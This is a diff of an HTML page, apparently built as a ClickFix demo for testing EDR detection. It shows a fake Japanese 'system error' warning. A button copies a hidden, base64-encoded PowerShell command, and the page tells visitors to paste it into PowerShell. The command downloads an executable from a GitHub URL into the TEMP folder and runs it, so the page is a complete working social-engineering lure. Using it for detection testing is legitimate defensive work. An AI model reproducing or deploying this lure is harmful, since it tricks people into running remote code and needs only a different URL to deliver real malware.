@@ -1,36 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>システムエラー修正ツール</title>
+    <title>ClickFixデモ</title>
     <style>
-        body { font-family: Arial; padding: 50px; background: #f0f0f0; }
-        .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: auto; }
-        .error { color: red; font-weight: bold; margin-bottom: 20px; }
-        .fix-button { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        .command-box { background: #f5f5f5; padding: 15px; border: 1px solid #ccc; margin: 20px 0; font-family: monospace; word-break: break-all; font-size: 11px; }
-        .copied { color: green; margin-top: 10px; display: none; }
+        body { font-family: Arial, sans-serif; padding: 50px; background: #f0f0f0; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
+        .header p { color: #666; font-size: 14px; }
+        .container { background: white; padding: 40px; border-radius: 10px; max-width: 700px; margin: auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .warning-icon { font-size: 48px; margin-bottom: 20px; }
+        .error { color: red; font-weight: bold; margin-bottom: 20px; font-size: 20px; }
+        .fix-button { background: #0078d4; color: white; padding: 15px 40px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
+        .fix-button:hover { background: #005a9e; }
+        .command-box { display: none; }
+        .copied { color: green; margin-top: 15px; display: none; font-weight: bold; }
+        .instructions { margin-top: 30px; font-size: 14px; color: #333; line-height: 1.8; }
+        .instructions ol { padding-left: 20px; }
     </style>
 </head>
 <body>
+    <div class="header">
+        <h1>ClickFixデモ</h1>
+        <p>EDR検知テスト用デモサイト</p>
+    </div>
+    
     <div class="container">
-        <h2>⚠️ システムエラーが検出されました</h2>
+        <div class="warning-icon">⚠️</div>
+        <h2>システムエラーが検出されました</h2>
         <p class="error">重要なシステムコンポーネントの更新が必要です</p>
-        <p>以下の修正コマンドを実行してください：</p>
+        <p>以下のボタンをクリックして修正コマンドをコピーしてください：</p>
         
         <div class="command-box" id="command">
 powershell -w hidden -Enc aQB3AHIAIAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYwBoAG8AcgBvADUAMQAxAC8AZABlAHQAZQBjAHQAaQBvAG4ALQB0AGUAcwB0AGkAbgBnAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGMAYQBsAGMALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAbABjAC4AZQB4AGUAOwAgAHMAdABhAHIAdAAgACQAZQBuAHYAOgBUAEUATQBQAFwAYwBhAGwAYwAuAGUAeABlAA==
         </div>
         
         <button class="fix-button" onclick="copyCommand()">修正コマンドをコピー</button>
-        <div class="copied" id="copied">✓ コピーしました！PowerShellに貼り付けて実行してください</div>
+        <div class="copied" id="copied">✓ コマンドをコピーしました！</div>
         
-        <p style="margin-top: 20px; font-size: 12px; color: #666;">
-            手順：<br>
-            1. 上記ボタンをクリック<br>
-            2. Windows キー + R を押す<br>
-            3. "powershell" と入力して Enter<br>
-            4. コピーしたコマンドを貼り付けて Enter
-        </p>
+        <div class="instructions">
+            <strong>手順：</strong>
+            <ol>
+                <li>上記ボタンをクリック</li>
+                <li>Windows キー + R を押す</li>
+                <li>"powershell" と入力して Enter</li>
+                <li>コピーしたコマンドを貼り付けて Enter</li>
+            </ol>
+        </div>
     </div>
     
     <script>
@@ -38,6 +53,11 @@ powershell -w hidden -Enc aQB3AHIAIAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAG
             const command = document.getElementById('command').textContent.trim();
             navigator.clipboard.writeText(command).then(() => {
                 document.getElementById('copied').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('copied').style.display = 'none';
+                }, 3000);
+            }).catch(err => {
+                alert('コピーに失敗しました。手動でコマンドをコピーしてください。');
             });
         }
     </script>
